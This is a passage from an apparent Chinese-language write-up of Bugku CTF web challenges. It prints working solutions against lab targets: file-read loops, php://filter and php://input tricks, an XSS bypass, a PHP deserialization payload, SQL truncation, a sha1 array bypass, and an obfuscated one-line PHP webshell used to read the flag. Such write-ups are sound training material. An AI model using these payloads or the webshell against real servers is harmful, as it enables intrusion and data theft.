rel="noopener">http://120.24.86.145:8002/web11/</a></p><p>答案格式：KEY{xxxxxxxx}</p></blockquote><p>重定向至<code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</code> ，发现可读源码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">30</span>):</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw'</span>%i</span><br><span class="line"><span class="keyword">print</span> requests.get(url).content.strip()</span><br></pre></td></tr></table></figure><p>读到<code>index.php</code> 如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进一步读取<code>keys.php</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">30</span>):</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=%s'</span>%(i,base64.b64encode(<span class="string">'keys.php'</span>))</span><br><span class="line"><span class="keyword">print</span> requests.get(url,headers=&#123;<span class="string">'cookie'</span>:<span class="string">'margin=margin'</span>&#125;).content.strip()</span><br></pre></td></tr></table></figure><p>读到<code>keys.php</code> 内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $key=<span class="string">'KEY&#123;key_keys&#125;'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote><p><a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">http://103.238.227.13:10089/</a></p><p>Flag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">关键代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSS注入测试<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-success"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>1、请注入一段XSS代码，获取Flag值<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>2、必须包含alert(_key_)，_key_会自动被替换<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"s"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> s=<span class="string">""</span>;<span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">============================================================</span><br><span class="line">利用Unicode编码绕过</span><br><span class="line">url: http://103.238.227.13:10089/?id=\u003c_key_\u003e</span><br><span class="line">Flag: 17f094325e90085b30a5ddefce34acd8</span><br></pre></td></tr></table></figure><h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h4><blockquote><p><a href="http://120.24.86.145:8006/test/hello.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test/hello.php</a></p><p>作者：御结冰城</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">直接访问<span class="number">120.24</span><span class="number">.86</span><span class="number">.145</span>:<span class="number">8006</span>/test/<span class="number">1</span>p.html会被重定向</span><br><span class="line">访问view-source:http:<span class="comment">//120.24.86.145:8006/test/1p.html得到</span></span><br><span class="line"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> ;</span><br><span class="line"><span class="keyword">print</span> unescape(Words) <span class="comment">//on chrome console</span></span><br><span class="line"><span class="comment">//&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; </span></span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span><br><span class="line"><span class="keyword">print</span> unescape(atob(<span class="string">'JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ=='</span>))</span><br><span class="line">-------------------------------------------</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line"><span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:8006/test/f4l2a3g.txt</span></span><br><span class="line">得到flag&#123;tHis_iS_THe_fLaG&#125;</span><br><span class="line">或者a=php:<span class="comment">//input&amp;id=0&amp;b=%00findneo....。。？？？？？？？</span></span><br></pre></td></tr></table></figure><h4 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h4><blockquote><p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/</a></p><p>作者：pupil</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://120.24.86.145:8006/test1/?file=php://filter/convert.base64-encode/resource=index.php&amp;txt=php://input</span></span><br><span class="line"><span class="comment">//post welcome to the bugkuctf</span></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//http://120.24.86.145:8006/test1/?file=php://filter/convert.base64-encode/resource=hint.php&amp;txt=php://input</span></span><br><span class="line"><span class="comment">//post welcome to the bugkuctf</span></span><br><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察PHP反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> Flag();</span><br><span class="line">$f-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">var_dump(serialize($f));</span><br><span class="line"><span class="comment">//string(41) "O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">访问</span><br><span class="line">view-source:http:<span class="comment">//120.24.86.145:8006/test1/?file=hint.php&amp;txt=php://input&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br><span class="line">同时post welcome to the bugkuctf</span><br><span class="line">得到 flag&#123;php_is_the_best_language&#125;</span><br></pre></td></tr></table></figure><h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><blockquote><p><a href="http://47.93.190.246:49163/" target="_blank" rel="noopener">http://47.93.190.246:49163/</a><br>flag格式：SKCTF{xxxxxxxxxxxxxxxxx}<br>hint:SQL约束攻击</p></blockquote><p>注册一个用户名为<code>admin                                                 1</code> ，密码随意的用户，然后用admin和该密码登陆。<code>SKCTF{4Dm1n_HaV3_GreAt_p0w3R}</code> </p><p>参考： <a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a></p><h4 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h4><blockquote><p><a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p><p>送给大家一个过狗一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>; $poc_1=explode(<span class="string">"#"</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//120.24.86.145:8010/?s=var_dump(scandir('.'))</span></span><br><span class="line">view-source:http:<span class="comment">//120.24.86.145:8010/?s=var_dump(file_get_contents('flag.txt'))</span></span><br><span class="line">string(<span class="number">25</span>) <span class="string">"BUGKU&#123;bugku_web_009801_a&#125;"</span></span><br></pre></td></tr></table></figure><h4 id="maccms-苹果cms"><a href="#maccms-苹果cms" class="headerlink" title="maccms - 苹果cms"></a>maccms - 苹果cms</h4><blockquote><p>地址：<a href="http://120.24.86.145:8009/" target="_blank" rel="noopener">http://120.24.86.145:8009/</a></p></blockquote><h4 id="appcms"><a href="#appcms" class="headerlink" title="appcms"></a>appcms</h4><blockquote><p><a href="http://120.24.86.145:8012/" target="_blank" rel="noopener">http://120.24.86.145:8012/</a></p><p>flag在根目录</p></blockquote><h4 id="小明的博客"><a href="#小明的博客" class="headerlink" title="小明的博客"></a>小明的博客</h4><blockquote><p><a href="http://120.24.86.145:9003/" target="_blank" rel="noopener">http://120.24.86.145:9003/</a></p><p>请勿破坏靶场</p></blockquote><h4 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h4><blockquote><p>各种绕过哟</p><p><a href="http://120.24.86.145:8002/web7/" target="_blank" rel="noopener">http://120.24.86.145:8002/web7/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]); </span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:8002/web7/?uname[]=&amp;id=margin</span></span><br><span class="line">post passwd[]=<span class="number">1</span></span><br><span class="line"> Flag: flag&#123;HACK_45hhs_213sDD&#125;</span><br></pre></td></tr></table></figure><h4 id="WEB8"><a href="#WEB8" class="headerlink" title="WEB8"></a>WEB8</h4><blockquote><p>txt？？？？</p><p><a href="http://120.24.86.145:8002/web8/" target="_blank" 